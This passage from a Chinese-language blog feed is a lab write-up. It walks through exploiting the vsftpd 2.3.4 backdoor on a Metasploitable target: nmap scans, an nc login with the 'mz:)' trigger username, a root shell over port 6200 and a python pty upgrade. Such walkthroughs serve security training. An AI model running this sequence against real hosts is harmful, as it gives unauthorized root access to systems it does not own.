+&lt;/li>
+&lt;li>
+&lt;p>修改 root 用户的密码：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfadmin@metasploitable:~$ sudo passwd root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>按提示输入新密码。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="二漏洞复现">&lt;strong>二、漏洞复现&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>端口扫描&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>在 Kali Linux 上打开终端，使用 nmap 扫描靶机的开放端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 192.168.xx.xx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>（将 &lt;code>192.168.xx.xx&lt;/code> 替换为靶机的实际 IP 地址）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>确认靶机开放了 21 (FTP) 端口。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221111-20250416221113-c45aigt.png"
+loading="lazy"
+alt="局部截取_20250416_221111"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>扫描 FTP 服务版本&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>使用 nmap 扫描 FTP 服务的版本信息：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sV 192.168.xx.xx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>确认靶机运行的是 vsftpd 2.3.4 版本。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221133-20250416221138-tl3olrd.png"
+loading="lazy"
+alt="局部截取_20250416_221133"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>触发漏洞&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>在 Kali Linux 上使用 Netcat (nc) 连接靶机的 21 端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.xx.xx &lt;span class="m">21&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>输入以下命令（注意手动输入）：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user mz:)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pass aaaaa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>此时靶机的 6200 端口会自动开启。保持当前终端状态，不要关闭。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221204-20250416221212-na23h58.png"
+loading="lazy"
+alt="局部截取_20250416_221204"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>验证 6200 端口&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>在 Kali Linux 上另起一个终端，使用 nmap 扫描 6200 端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p &lt;span class="m">6200&lt;/span> 192.168.xx.xx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>确认 6200 端口已开启。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221242-20250416221245-a36mo8g.png"
+loading="lazy"
+alt="局部截取_20250416_221242"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>获取 root 权限&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>使用 Netcat 连接靶机的 6200 端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.xx.xx &lt;span class="m">6200&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>成功连接后，即可以 root 身份登录靶机。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221315-20250416221318-gied7ac.png"
+loading="lazy"
+alt="局部截取_20250416_221315"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>注意：连接后执行ls查看是都已经进去半终端&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>确认进入半终端可执行python -c &amp;lsquo;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo; 调用完整终端&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="三实验注意事项">&lt;strong>三、实验注意事项&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>如果在实验过程中遇到问题，可以尝试重启靶机。&lt;/li>
+&lt;li>确保在触发漏洞后保持 Netcat 连接状态，否则 6200 端口可能会关闭。&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;p>&lt;strong>实验总结：&lt;/strong>
+本次实验通过 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。&lt;/p></description></item></channel></rss>
